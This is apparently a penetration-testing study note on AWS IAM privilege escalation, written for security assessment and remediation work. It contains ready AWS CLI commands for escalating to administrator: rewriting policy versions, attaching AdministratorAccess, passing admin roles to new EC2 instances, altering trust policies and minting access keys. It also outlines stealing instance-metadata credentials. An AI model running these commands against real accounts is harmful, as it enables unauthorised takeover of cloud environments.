---
tags: [aws, iam, cloud-security, privilege-escalation, misconfiguration]
difficulty: intermediate
module: "37 - Cloud Infrastructure"
topic: "37.01 AWS IAM"
---

# AWS IAM — Roles, Policies, and Misconfigurations

## 1. Introduction to AWS IAM
AWS Identity and Access Management (IAM) is the foundational service that controls access to AWS resources. It provides granular access control across all of AWS. When IAM is misconfigured, it often becomes the single point of failure that allows an attacker to escalate privileges, move laterally, or persist within an AWS environment.

AWS IAM operates on a deny-by-default basis. An entity (User or Role) requires explicit `Allow` permissions to perform actions against AWS services. This authorization is evaluated through a complex logic mechanism involving Identity-Based Policies, Resource-Based Policies, IAM Permissions Boundaries, Service Control Policies (SCPs), and Session Policies.

Understanding the depth of these components is crucial to identifying and exploiting misconfigurations effectively during a Cloud VAPT assessment.

## 2. Core Components of IAM
- **IAM Users**: Long-term credentials representing a human or a service. Consists of a username, password (for Console), and Access Keys (for CLI/API).
- **IAM Groups**: Collections of IAM Users. Policies attached to a group apply to all users within it.
- **IAM Roles**: Identities that can be assumed by entities (AWS services, federated users, or other AWS accounts) for temporary, short-term credentials (STS).
- **IAM Policies**: JSON documents defining the permissions. They consist of Statements, which include `Effect`, `Action`, `Resource`, and optionally `Condition`.
- **Trust Policies (AssumeRole Policies)**: A specific type of resource-based policy attached to an IAM Role, dictating *who* or *what* can assume that role.

### The Policy Evaluation Logic
When AWS evaluates an API request, it combines all applicable policies.
1. Explicit Deny overrides any Allow.
2. An explicit Allow in an Identity-based or Resource-based policy grants access, provided it's not restricted by boundaries or SCPs.
3. If there's no explicit Allow, the action is implicitly denied.

## 3. ASCII Architecture Diagram: IAM Privilege Escalation Flow

```text
    [ Compromised Web App ]
             |
             |  1. SSRF or RCE
             v
      [ EC2 Instance ] --------------------------+
             |                                   |
             |  2. Query IMDSv1/v2               |
             |  http://169.254.169.254/...       |
             v                                   |
 [ EC2 Instance Profile (Role) ]                 |
             |                                   |
             |  3. Extract STS Credentials       |
             |  (AccessKey, SecretKey, Token)    |
             v                                   |
   [ Attacker Machine ] <------------------------+
             |
             |  4. Authenticate to AWS API via CLI
             v
 [ IAM Policy Evaluation ]
             |
             |  5. Check permissions (e.g., iam:PutUserPolicy)
             v
 [ Privilege Escalation ]
             |
             |  6. Attach AdministratorAccess to self or
             |     create a new Admin user.
             v
  [ Full Environment Compromise ]
```

## 4. Common IAM Misconfigurations & Attack Vectors

IAM privilege escalation typically occurs because a principal has the ability to modify policies, roles, or other entities in a way that grants them more privileges than they started with. The Rhino Security Labs research identified at least 21 distinct IAM privilege escalation vectors.

### 4.1. `iam:CreatePolicyVersion`
If an attacker has the `iam:CreatePolicyVersion` permission, they can create a new version of an existing managed policy attached to their user or role.
- **Exploitation**: The attacker creates a new policy version granting `*` on `*` and sets it as the default version.
- **Command**:
  ```bash
  aws iam create-policy-version \
      --policy-arn arn:aws:iam::123456789012:policy/VulnerablePolicy \
      --policy-document file://admin-policy.json \
      --set-as-default
  ```
- **Why it works**: AWS allows up to 5 policy versions. Creating a new version and setting it as default immediately updates the permissions of all identities using that policy.

### 4.2. `iam:SetDefaultPolicyVersion`
Even without the ability to create a new version, an attacker with `iam:SetDefaultPolicyVersion` might revert the policy to an older, overly permissive version.
- **Exploitation**:
  ```bash
  aws iam set-default-policy-version \
      --policy-arn arn:aws:iam::123456789012:policy/VulnerablePolicy \
      --version-id v1
  ```

### 4.3. `iam:PassRole` and `ec2:RunInstances`
The `iam:PassRole` permission allows a user to assign an IAM Role to an AWS resource. If a user can pass an arbitrary role to an EC2 instance and run that instance, they can access the instance and extract the credentials for that role.
- **Exploitation**:
  1. Create a script (`userdata.sh`) that sends the metadata service credentials back to the attacker.
  2. Launch an EC2 instance, passing a high-privilege IAM role.
  ```bash
  aws ec2 run-instances \
      --image-id ami-0c55b159cbfafe1f0 \
      --instance-type t2.micro \
      --iam-instance-profile Name=AdminRoleProfile \
      --user-data file://userdata.sh
  ```
- **Why it works**: The attacker is essentially delegating the high-privilege role to a machine they control, bypassing direct assignment restrictions.

### 4.4. `iam:PutUserPolicy` / `iam:AttachUserPolicy`
If a user can attach or inline policies to themselves, the escalation is trivial.
- **Exploitation**:
  ```bash
  aws iam attach-user-policy \
      --user-name attacker_user \
      --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
  ```

### 4.5. `iam:UpdateAssumeRolePolicy`
This permission allows an attacker to modify the trust policy of an existing role. If there is a high-privileged role (like an Admin role for CI/CD), the attacker can modify its trust policy to allow their own compromised user to assume it.
- **Exploitation**:
  ```bash
  aws iam update-assume-role-policy \
      --role-name HighPrivilegeRole \
      --policy-document file://trust-policy.json
  ```
  Where `trust-policy.json` allows the attacker's principal to `sts:AssumeRole`.

### 4.6. `iam:CreateAccessKey`
An attacker with this permission can generate new access keys for any user. If they find an admin user without an active second set of keys, they can simply generate one.
- **Exploitation**:
  ```bash
  aws iam create-access-key --user-name AdminUser
  ```

## 5. Identifying Misconfigurations (Reconnaissance)
During an assessment, an attacker typically enumerates their own permissions first.

### 5.1. Enumerating Permissions
- **Enumerate IAM capabilities**:
  ```bash
  aws iam get-user
  aws iam list-attached-user-policies --user-name <username>
  aws iam list-user-policies --user-name <username>
  ```
- **Using Brute-Force Checkers**: Tools like `enumerate-iam` or `pacu` can automate the process of checking what actions are allowed by brute-forcing dry-run API calls or analyzing the JSON policies.

### 5.2. Automated Auditing Tools
- **Pacu**: The AWS exploitation framework by Rhino Security Labs. Modules like `iam__privesc_scan` automatically detect misconfigurations.
- **ScoutSuite**: Multi-cloud security-auditing tool that checks for overly permissive IAM configurations.
- **Cloudsplaining**: Evaluates IAM policies and identifies violations of least privilege, specifically looking for Privilege Escalation, Data Exfiltration, and Resource Exposure.

## 6. Advanced Scenario: Cross-Account Role Assumption
A very common architecture pattern involves cross-account roles, where an identity in Account A assumes a role in Account B.
- **The Misconfiguration**: The Trust Policy in Account B uses `*` for the principal or fails to restrict the `sts:ExternalId`.
- **The "Confused Deputy" Problem**: If a third-party service (like a SaaS posture management tool) is granted cross-account access via an IAM role, and it doesn't enforce a unique `ExternalId` tied to a specific customer, an attacker can trick the SaaS provider into assuming the role using the attacker's SaaS tenant.
- **Mitigation**: Always use `sts:ExternalId` in trust policies for roles accessed by third parties.

## 7. Shadow Admins
A Shadow Admin is an IAM entity that does not have explicit `AdministratorAccess` (e.g., they don't have `*` on `*`), but they possess enough permissions to escalate to full administrator. Identifying shadow admins is a critical phase of cloud penetration testing. It requires deep graph-based analysis of permissions. Tools like `AWSPx` can help visualize the effective permissions.

## 8. Remediation and Best Practices
1. **Principle of Least Privilege**: Never grant `*` permissions unless absolutely necessary. Scope policies to specific ARNs.
2. **Permissions Boundaries**: Use IAM Permissions Boundaries to set the maximum permissions that an identity-based policy can grant to an IAM entity. Even if a user has `iam:PutUserPolicy`, they cannot escalate beyond the boundary.
3. **Use IAM Access Analyzer**: AWS IAM Access Analyzer helps identify resources shared with external entities and validates IAM policies against AWS best practices.
4. **Enforce MFA**: Require MFA for all IAM users, especially for those with high privileges or the ability to modify IAM.
5. **Regular Audits**: Continuously audit IAM roles and users. Remove unused roles, inactive access keys, and overly permissive policies.

## 9. Conclusion
IAM is the control plane of AWS. Misconfigurations here are almost always fatal to the security posture of the environment. Unlike traditional networks where a pivot might require exploiting an OS-level vulnerability, in AWS, a pivot is often just a matter of finding the right IAM action that allows role assumption or policy modification.

---

## Chaining Opportunities
- **[[03 - AWS EC2 — Metadata Service (IMDS) Exploitation]]**: Obtaining initial IAM credentials via EC2 SSRF or RCE is the standard precursor to IAM enumeration and privilege escalation.
- **[[04 - AWS Lambda — Privilege Escalation, Event Injection]]**: Exploiting `iam:PassRole` in conjunction with Lambda creation can lead to executing code with higher privileges.
- **[[06 - AWS SecretsManager Parameter Store — Misconfigured Access]]**: Once privileges are escalated, the next logical step is dumping all sensitive secrets from SecretsManager or SSM.

## Related Notes
- [[02 - AWS S3 — Public Access, ACL Misconfiguration]]
- [[05 - AWS ECS EKS — Container Privilege Escalation]]
- [[07 - AWS CloudTrail — Disabling Logging]]
